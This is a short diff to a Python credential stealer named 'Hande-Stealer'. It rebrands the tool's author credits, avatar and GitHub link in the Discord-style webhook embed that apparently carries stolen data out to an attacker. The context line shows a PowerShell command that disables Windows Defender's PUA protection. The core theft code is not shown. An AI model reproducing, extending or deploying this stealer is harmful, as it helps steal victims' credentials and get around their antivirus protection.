@@ -26,18 +26,15 @@ os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
 
 hook = Webhook("https://Your Webhook Url") #change this
 embed = Embed(
-    description='Hande-Stealer From Swagkarna! :smiley:',
+    description='Hande-Stealer From Swagkarna and Dagger Devs! :smiley:',
     color=0x5CDBF0,
     timestamp='now'  
     )
-image1 = 'https://avatars.githubusercontent.com/u/79452028?s=460&u=0602f46611611527d9f4147aa67c47fa4b2fe739&v=4'
+image1 = 'https://avatars.githubusercontent.com/u/51061101?v=4'
 
 
 embed.set_author(name='Author : swagkarna', icon_url=image1)
-embed.add_field(name='Github Profile', value='https://github.com/swagkarna')
-                
-embed.add_field(name='Youtube', value='https://www.youtube.com/channel/UCszs81OmjgsLzNsgk3f4yxw')
-embed.set_footer(text='Happy Hacking', icon_url=image1)
+embed.add_field(name='Github Profile', value='https://github.com/DaggerDevs')
 
 embed.set_thumbnail(image1)
 
